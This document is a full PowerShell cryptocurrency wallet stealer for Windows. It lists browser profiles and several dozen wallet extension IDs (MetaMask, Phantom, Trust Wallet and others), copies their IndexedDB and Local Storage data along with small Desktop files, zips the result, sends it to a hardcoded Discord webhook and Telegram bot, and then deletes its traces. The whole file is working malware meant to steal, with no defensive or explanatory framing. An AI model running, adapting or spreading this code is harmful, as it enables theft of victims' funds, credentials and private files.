#Requires -Version 5.1

# ============================================================
# MULTI-C2 WALLET STEALER - Windows Version (DISCORD + TELEGRAM)
# Exfiltrates to: Discord + Telegram
# ============================================================

$ErrorActionPreference = 'SilentlyContinue'

# === CONFIGURATION ===
$DEST = "$env:TEMP\myfiles"
$WDIR = "$DEST\mycryptowallet"
$DESK = [Environment]::GetFolderPath("Desktop")
$MAX = 102400

# === C2 ENDPOINTS ===
$DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1542884569437569145/BTwXNkIkJVhoBkZbB6qxzd7cqbET39qEmTc0T2XtdWaJyULFFCJXBi55mpFGYdF3WzqR"

# === FUNCTIONS (scanning) ===
function sn($s) { $s -replace '[\\/:*?"<>|(){} @.]', '_' }
function scp($s,$d) { if (Test-Path $s) { Copy-Item $s $d -Recurse -Force -EA SilentlyContinue } }

function blist {
    $L = $env:LOCALAPPDATA; $R = $env:APPDATA
    return @(
        "Chrome|$L\Google\Chrome\User Data"
        "Chrome Canary|$L\Google\Chrome SxS\User Data"
        "Brave|$L\BraveSoftware\Brave-Browser\User Data"
        "Edge|$L\Microsoft\Edge\User Data"
        "Opera|$R\Opera Software\Opera Stable"
        "Opera GX|$R\Opera Software\Opera GX Stable"
        "Vivaldi|$L\Vivaldi\User Data"
        "Yandex|$L\Yandex\YandexBrowser\User Data"
        "Thorium|$L\Thorium\User Data"
        "Chromium|$L\Chromium\User Data"
        "Arc|$L\Packages\TheBrowserCompany.Arc_ttt1ap7aakyb4\LocalCache\Local\Arc\User Data"
    )
}

function wlist {
    return @(
        "nkbihfbeogaeaoehlefnkodbefgpgknn|MetaMask"
        "acmacodkjbdgmoleebolmdjonilkdbch|Rabby Wallet"
        "odbfpeeihdkbihmopkbjmoonfanlbfcl|MyEtherWallet"
        "nlbmnnijcnlegkjjpcfjclmcfggfefdm|MEW CX"
        "opfgelmcmbiajamepnmloijbpoleiama|Rainbow"
        "kkpllkodjeloidieedojogacfhpaihoh|Enkrypt"
        "hifafgmccdpekplomjjkcfgodnhcellj|Crypto.com DeFi"
        "fhbohimaelbohpjbbldcngcnapndodjp|BNB Chain"
        "cgeeodpfagjceefieflmdfphplkenlfk|ONTO Wallet"
        "cjelfplplebdjjenllpjcblmjkfcffne|Jaxx Liberty"
        "hpglfhgfnhbgpjdenjgmdgoeiappafln|Guarda Wallet"
        "nanjmdknhkinifnkgdcggcfnhdaammmj|Wombat"
        "gaedmjdfmmahhbjefcbgaolhhanlaolb|HyperPay"
        "fhilaheimglignddkjgofkcbgekhenbh|Oxalus"
        "hnfanknocfeofbddgcijnmhnfnkdnaad|Coinbase Wallet"
        "egjidjbpglichdcondbcbdnbeeppgdph|Trust Wallet"
        "aholpfdialjgjfhomihkjbmgjidlcdno|Exodus"
        "mcohilncbfahbmgdjkbpemcciiolgcge|OKX Wallet"
        "mfgccjchihfkkindfppnaooecgfneiii|TokenPocket"
        "bfnaelmomeimhjnjophhpkkoljpa|Phantom"
        "bhhhlbepdkbapadjdnnojkbgioiodbic|Solflare"
        "epapihdplajcdnnkdeiahlgigofloibg|Slope Wallet"
        "dmkamcknogkgcdfhhbddcghachkejeap|Keplr"
        "aiifbnbfobpmeekipheeijimdpnlpgpp|Terra Station"
        "ibnejdfjmmkpcnlpebklmnkoeoihofec|TronLink"
        "ffnbelfdoeiohenkjibnmadjiehjhajb|Yoroi"
        "jiidiaalihmmhddjgbnbgdfflelocpak|HashPack"
        "ejjladinnckdgjemekebdpeokbikhfci|Petra Aptos"
        "nknhiehlklippafakaeklbeglecifhad|Martian Aptos"
        "fnnegphlobjdpkhecapkijjdkgcjhkib|Sui Wallet"
        "opcgpfmipidbgpenhmajoajpbobppdil|Suiet"
        "cnmamaachppnkjgnildpdmkaakejnhae|Auro Mina"
        "fnjhmkhhmkbjkkabndcnnogagogbneec|Ronin Wallet"
    )
}

function fflist {
    return @(
        "{d3e7e3df-07b8-4f27-be36-9f4c19cf5ede}|MetaMask"
        "webextension@metamask.io|MetaMask"
        "firefox@metamask.io|MetaMask"
        "{530f7c6c-6077-4703-8f71-cb368c7ba294}|Phantom"
        "{a4335603-26d8-4bba-b3db-2a7ced9f1c48}|Coinbase Wallet"
        "{eadbf29f-4603-4234-98f5-efc4985e6c85}|Keplr"
        "{7e09ce40-b81c-4fe9-a7e3-f8a04dd7cf98}|Ronin Wallet"
        "ronin@axieinfinity.com|Ronin Wallet"
        "{d5e44f8f-4d43-4e48-8e0f-85ab4da78fba}|Yoroi"
    )
}

function desktop {
    New-Item $DEST -ItemType Directory -Force -EA SilentlyContinue | Out-Null
    Get-ChildItem $DESK -File -EA SilentlyContinue | ForEach-Object {
        if ($_.Length -le $MAX) {
            $dst = Join-Path $DEST $_.Name
            if (Test-Path $dst) {
                $ts = Get-Date -Format HHmmss
                $dst = if ($_.Extension) { Join-Path $DEST "$($_.BaseName)_$ts$($_.Extension)" }
                       else { Join-Path $DEST "$($_.Name)_$ts" }
            }
            Copy-Item $_.FullName $dst -EA SilentlyContinue
        }
    }
}

function cpw($bn, $pd, $id, $wn) {
    $pn = Split-Path $pd -Leaf
    $out = Join-Path $WDIR "$(sn $bn)\$(sn $pn)\$(sn $wn)"
    New-Item $out -ItemType Directory -Force -EA SilentlyContinue | Out-Null
    $ver = Get-ChildItem "$pd\Extensions\$id" -Directory -EA SilentlyContinue | Sort-Object Name | Select-Object -Last 1
    if ($ver) { scp "$($ver.FullName)\manifest.json" "$out\manifest.json" }
    $idb = "$pd\IndexedDB\chrome-extension_${id}_0.indexeddb.leveldb"
    if (Test-Path $idb) {
        New-Item "$out\IndexedDB" -ItemType Directory -Force -EA SilentlyContinue | Out-Null
        scp $idb "$out\IndexedDB"
    }
    $ls = "$pd\Local Storage\leveldb"
    if (Test-Path $ls) {
        New-Item "$out\LS" -ItemType Directory -Force -EA SilentlyContinue | Out-Null
        Get-ChildItem $ls -Include "*.ldb","*.log" -EA SilentlyContinue | Copy-Item -Destination "$out\LS" -Force -EA SilentlyContinue
    }
    "wallet=$wn`nbrowser=$bn`nprofile=$pn`next_id=$id" | Set-Content "$out\INFO.txt" -Encoding UTF8
}

function chromium {
    foreach ($b in blist) {
        $bn, $bp = $b.Split('|', 2)
        if (-not (Test-Path $bp)) { continue }
        Get-ChildItem $bp -Directory -EA SilentlyContinue |
            Where-Object { $_.Name -eq "Default" -or $_.Name -like "Profile*" } | ForEach-Object {
            $pd = $_.FullName
            if (-not (Test-Path "$pd\Extensions")) { return }
            foreach ($w in wlist) {
                $id, $wn = $w.Split('|', 2)
                if (Test-Path "$pd\Extensions\$id") { cpw $bn $pd $id $wn }
            }
        }
    }
}

function firefox_scan {
    @("Firefox|$env:APPDATA\Mozilla\Firefox\Profiles",
      "Waterfox|$env:APPDATA\Waterfox\Profiles",
      "LibreWolf|$env:LOCALAPPDATA\LibreWolf\Profiles") | ForEach-Object {
        $lbl, $base = $_.Split('|', 2)
        if (-not (Test-Path $base)) { return }
        Get-ChildItem $base -Directory -EA SilentlyContinue | ForEach-Object {
            $pd = $_.FullName; $pn = $_.Name; $ed = "$pd\extensions"
            if (-not (Test-Path $ed)) { return }
            foreach ($w in fflist) {
                $id, $wn = $w.Split('|', 2)
                $xpi = "$ed\$id.xpi"; $dir = "$ed\$id"
                $fp = if (Test-Path $xpi) { $xpi } elseif (Test-Path $dir) { $dir } else { $null }
                if (-not $fp) { continue }
                $out = Join-Path $WDIR "$(sn $lbl)\$pn\$(sn $wn)"
                New-Item $out -ItemType Directory -Force -EA SilentlyContinue | Out-Null
                $sd = "$pd\browser-extension-data\$id"
                if (Test-Path $sd) {
                    New-Item "$out\storage" -ItemType Directory -Force -EA SilentlyContinue | Out-Null
                    scp $sd "$out\storage"
                }
                "wallet=$wn`next_id=$id`nbrowser=$lbl`nprofile=$pn" | Set-Content "$out\INFO.txt" -Encoding UTF8
            }
        }
    }
}

function brave_builtin {
    $bp = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    if (-not (Test-Path $bp)) { return }
    Get-ChildItem $bp -Directory -EA SilentlyContinue |
        Where-Object { $_.Name -eq "Default" -or $_.Name -like "Profile*" } | ForEach-Object {
        $pd = $_.FullName; $pn = $_.Name
        if (-not (Test-Path "$pd\Preferences")) { return }
        if ((Get-Content "$pd\Preferences" -Raw -EA SilentlyContinue) -match '"brave_wallet"') {
            $out = Join-Path $WDIR "Brave\$pn\Brave_Builtin"
            New-Item $out -ItemType Directory -Force -EA SilentlyContinue | Out-Null
            scp "$bp\Local State" "$out\LocalState.json"
            "wallet=Brave Builtin`nbrowser=Brave`nprofile=$pn" | Set-Content "$out\INFO.txt" -Encoding UTF8
        }
    }
}

# ============================================================
# C2 EXFILTRATION FUNCTIONS (WORKING)
# ============================================================

function Exfil-Discord {
    param([string]$FilePath)
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $base64 = [Convert]::ToBase64String($fileBytes)
        $fileName = Split-Path $FilePath -Leaf
        
        $jsonPayload = @{
            content = "📦 Stolen data: $fileName"
            file = $base64
        } | ConvertTo-Json -Compress
        
        Invoke-RestMethod -Uri $DISCORD_WEBHOOK -Method Post -Body $jsonPayload -ContentType "application/json" -TimeoutSec 30 -EA Stop | Out-Null
        return $true
    } catch { return $false }
}

function Exfil-Telegram {
    param([string]$FilePath)
    try {
        # Hardcoded credentials (scope-proof)
        $token = "8260472498:AAFsG2LqDNxQm71kL3aCYTiRDQqIKz_7jxA"
        $chatId = "7361517001"
        $fileName = Split-Path $FilePath -Leaf
        
        Add-Type -AssemblyName System.Net.Http -EA Stop
        
        $url = "https://api.telegram.org/bot$token/sendDocument"
        
        $client = New-Object System.Net.Http.HttpClient
        $multipart = New-Object System.Net.Http.MultipartFormDataContent
        
        $chatContent = New-Object System.Net.Http.StringContent($chatId)
        $multipart.Add($chatContent, "chat_id")
        
        $fileStream = [System.IO.File]::OpenRead($FilePath)
        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
        $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
        $multipart.Add($fileContent, "document", $fileName)
        
        $response = $client.PostAsync($url, $multipart).Result
        $responseContent = $response.Content.ReadAsStringAsync().Result
        
        $fileStream.Close()
        $client.Dispose()
        $multipart.Dispose()
        
        $json = $responseContent | ConvertFrom-Json
        return $json.ok -eq $true
    } catch {
        return $false
    }
}

function Exfil-All {
    param([string]$FilePath)
    
    # Debug: Check if file exists
    if (-not (Test-Path $FilePath)) {
        Write-Host "❌ File not found: $FilePath" -ForegroundColor Red
        return 0
    }
    Write-Host "📁 File size: $((Get-Item $FilePath).Length) bytes" -ForegroundColor Gray
    
    $methods = @(
        @{Name="Discord"; Function={Exfil-Discord $FilePath}},
        @{Name="Telegram"; Function={Exfil-Telegram $FilePath}}
    )
    $success = 0
    Write-Host "📤 Exfiltrating to TWO C2 channels..." -ForegroundColor Yellow
    foreach ($method in $methods) {
        Write-Host -NoNewline "  → $($method.Name)... "
        $result = & $method.Function
        if ($result) {
            Write-Host "✅" -ForegroundColor Green
            $success++
        } else {
            Write-Host "❌" -ForegroundColor Red
        }
    }
    Write-Host "📊 Exfiltrated to $success/2 channels" -ForegroundColor Cyan
    return $success
}

# ============================================================
# MAIN EXECUTION
# ============================================================

if ($env:OS -ne "Windows_NT") { exit 1 }

Write-Host "🔍 Scanning for cryptocurrency wallets..." -ForegroundColor Yellow
New-Item $DEST -ItemType Directory -Force -EA SilentlyContinue | Out-Null
New-Item $WDIR -ItemType Directory -Force -EA SilentlyContinue | Out-Null

desktop
chromium
firefox_scan
brave_builtin

"TEST_DATA $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" | Out-File "$DEST\test.txt" -Encoding UTF8 -Force

# Create ZIP
$ZIP_OUT = "$env:TEMP\myfiles.zip"
if (Test-Path $ZIP_OUT) { Remove-Item $ZIP_OUT -Force -EA SilentlyContinue }

try {
    Add-Type -Assembly System.IO.Compression.FileSystem -EA Stop
    [System.IO.Compression.ZipFile]::CreateFromDirectory($DEST, $ZIP_OUT)
} catch {
    try { Compress-Archive -Path "$DEST\*" -DestinationPath $ZIP_OUT -Force -EA SilentlyContinue } catch {}
}

# Exfiltrate
if (Test-Path $ZIP_OUT) {
    $successCount = Exfil-All $ZIP_OUT
    if ($successCount -gt 0) {
        Write-Host "✅ Successfully exfiltrated via $successCount C2 channels" -ForegroundColor Green
    } else {
        Write-Host "❌ All C2 channels failed - check credentials" -ForegroundColor Red
    }
} else {
    Write-Host "❌ Failed to create ZIP archive" -ForegroundColor Red
}

# Cleanup
Remove-Item $DEST -Recurse -Force -EA SilentlyContinue
Remove-Item $ZIP_OUT -Force -EA SilentlyContinue

Write-Host "✅ Done." -ForegroundColor Green
